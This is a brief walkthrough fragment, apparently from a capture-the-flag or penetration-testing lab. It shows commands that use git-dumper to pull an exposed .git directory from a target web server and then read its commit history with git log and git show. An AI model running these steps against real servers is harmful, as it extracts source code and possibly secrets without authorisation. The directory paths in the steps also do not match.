> Head over to `/opt/git-dumper` then run:

```
sudo mkdir gitdump
```

> Now to extract the git files from the webserver:

```
sudo ./git_dumper.py http://<target_ip>/.git gitdump 
```

> Now go to the gitdump directory and run git log:

```
cd /gitdump
git log
```

> Now to extract the information run the following:

```
git log | grep commit | cut -d " " -f2 | xargs git show
```

